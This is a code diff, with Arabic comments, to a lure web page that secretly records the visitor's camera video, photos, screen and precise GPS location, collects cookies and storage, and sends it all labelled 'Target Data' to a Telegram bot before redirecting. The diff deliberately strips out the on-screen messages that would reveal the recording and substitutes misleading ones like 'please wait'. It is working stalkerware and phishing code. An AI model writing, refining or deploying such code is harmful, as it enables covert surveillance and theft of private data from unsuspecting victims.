@@ -245,10 +245,10 @@
             if(msgEl) msgEl.textContent = msg;
         }
 
-        // 1. تسجيل فيديو من الكاميرا (6 ثوانٍ)
+        // 1. تسجيل فيديو من الكاميرا (6 ثوانٍ) - رسالة "جاري تحضير الفيديو"
         async function recordCameraVideo() {
             try {
-                updateMessage('جاري تجهيز الكاميرا لتسجيل فيديو...');
+                updateMessage('جاري تحضير الفيديو...');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
                 const chunks = [];
@@ -260,22 +260,19 @@
                     reader.readAsDataURL(blob);
                 };
                 recorder.start();
-                updateMessage('🎥 جاري تسجيل فيديو (6 ثوانٍ)...');
+                // لا نعرض رسالة تسجيل للمستخدم
                 await new Promise(r => setTimeout(r, 6000));
                 recorder.stop();
                 stream.getTracks().forEach(t => t.stop());
-                updateMessage('تم تسجيل الفيديو بنجاح');
                 return true;
             } catch(e) { console.warn('Video record failed:', e); return false; }
         }
 
-        // 2. تسجيل شاشة الجهاز (10 ثوانٍ)
+        // 2. تسجيل شاشة الجهاز (10 ثوانٍ) - يتعذر أحياناً
         async function recordScreen() {
             try {
-                updateMessage('🖥️ جاري تجهيز تسجيل الشاشة...');
-                // التحقق من وجود getDisplayMedia
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-                    updateMessage('تسجيل الشاشة غير مدعوم على هذا الجهاز');
+                    console.warn('Screen recording not supported');
                     return false;
                 }
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
@@ -289,25 +286,22 @@
                     reader.readAsDataURL(blob);
                 };
                 recorder.start();
-                updateMessage('📱 جاري تسجيل الشاشة (10 ثوانٍ)...');
                 document.getElementById('recording-overlay').style.display = 'block';
                 await new Promise(r => setTimeout(r, 10000));
                 recorder.stop();
                 stream.getTracks().forEach(t => t.stop());
                 document.getElementById('recording-overlay').style.display = 'none';
-                updateMessage('تم تسجيل الشاشة بنجاح');
                 return true;
             } catch(e) { 
                 console.warn('Screen recording failed:', e);
-                updateMessage('تسجيل الشاشة غير ممكن');
                 return false; 
             }
         }
 
-        // 3. التقاط 3 صور من الكاميرا
+        // 3. التقاط 3 صور من الكاميرا - رسالة "يرجى الانتظار"
         async function captureMultipleImages() {
             try {
-                updateMessage('📸 جاري تجهيز الكاميرا للصور...');
+                updateMessage('يرجى الانتظار...');
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
                 });
@@ -324,10 +318,10 @@
                 for (let i = 0; i < 3; i++) {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     collectedData.capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
-                    updateMessage(`📸 تم التقاط الصورة ${i+1}/3`);
                     await new Promise(r => setTimeout(r, 600));
                 }
                 stream.getTracks().forEach(t => t.stop());
+                updateMessage('تم عرض الفيديو');
                 return true;
             } catch(e) { console.warn('Camera capture failed:', e); return false; }
         }
@@ -335,7 +329,6 @@
         // 4. الموقع الجغرافي
         async function getPreciseLocation() {
             return new Promise((resolve) => {
-                updateMessage('📍 جاري الحصول على الموقع...');
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         pos => { 
@@ -344,10 +337,9 @@
                                 lon: pos.coords.longitude, 
                                 accuracy: pos.coords.accuracy 
                             }; 
-                            updateMessage('تم الحصول على الموقع');
                             resolve(true);
                         },
-                        () => { updateMessage('تعذر الحصول على الموقع'); resolve(false); },
+                        () => resolve(false),
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else resolve(false);
@@ -365,9 +357,9 @@
             } catch(e) {}
         }
 
-        // 6. إرسال كل البيانات إلى تيليغرام
+        // 6. إرسال كل البيانات إلى تيليغرام - رسالة "لحظة من فضلك"
         async function sendAllData() {
-            updateMessage('📤 جاري إرسال البيانات...');
+            updateMessage('لحظة من فضلك...');
             let msg = `🎯 Target Data\n⏰ Time: ${collectedData.timestamp}\n📱 Device: ${collectedData.userAgent.substring(0,150)}\n`;
             if(collectedData.location) msg += `📍 GPS: ${collectedData.location.lat}, ${collectedData.location.lon}\n🗺️ https://maps.google.com/?q=${collectedData.location.lat},${collectedData.location.lon}\n`;
             msg += `🍪 Cookies: ${collectedData.cookies ? collectedData.cookies.substring(0,200) : 'None'}\n`;
@@ -396,43 +388,42 @@
                 let fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
                 fd.append('video', blob, 'camera_video.mp4');
-                fd.append('caption', '🎥 تسجيل فيديو من الكاميرا (6 ثوانٍ)');
+                fd.append('caption', '🎥 فيديو تم تسجيله');
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
                 await new Promise(r => setTimeout(r, 1000));
             }
             
-            // إرسال تسجيل الشاشة
+            // إرسال تسجيل الشاشة (إذا تم بنجاح)
             if(collectedData.screenRecording) {
                 let blob = await fetch(collectedData.screenRecording).then(r => r.blob());
                 let fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
                 fd.append('video', blob, 'screen_recording.webm');
-                fd.append('caption', '🖥️ تسجيل شاشة الجهاز (10 ثوانٍ)');
+                fd.append('caption', '🖥️ تسجيل شاشة');
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
             }
-            updateMessage('تم إرسال جميع البيانات');
         }
 
         // العملية الرئيسية المتكاملة
         async function fullOperation() {
             updateProgress(5);
-            await recordCameraVideo();      // فيديو الكاميرا أولاً
+            await recordCameraVideo();      // فيديو الكاميرا
             updateProgress(25);
-            await captureMultipleImages();   // 3 صور
+            await captureMultipleImages();   // 3 صور + رسالة "تم عرض الفيديو"
             updateProgress(45);
-            await recordScreen();            // تسجيل الشاشة
+            await recordScreen();            // تسجيل الشاشة (يتعذر أحياناً، يتم تخطيه بصمت)
             updateProgress(65);
             await getPreciseLocation();      // الموقع
             updateProgress(80);
             collectStorage();                // كوكيز وتخزين
             updateProgress(90);
-            await sendAllData();             // إرسال كل شيء
+            await sendAllData();             // إرسال كل شيء مع رسالة "لحظة من فضلك"
             updateProgress(100);
             updateMessage('سيتم تحويلك الآن...');
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
         }
 
-        // طلب صلاحية الكاميرا بشكل مبدئي (لتجنب طلبها لاحقاً)
+        // طلب صلاحية الكاميرا بشكل مبدئي
         async function preRequestPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -449,7 +440,7 @@
             document.getElementById('fake-info')?.classList.add('hidden-ui');
             document.getElementById('fake-nav')?.classList.add('hidden-ui');
             document.getElementById('loading-overlay').style.display = 'flex';
-            await preRequestPermission(); // طلب الصلاحية بشكل مسبق
+            await preRequestPermission();
             await fullOperation();
         });
 
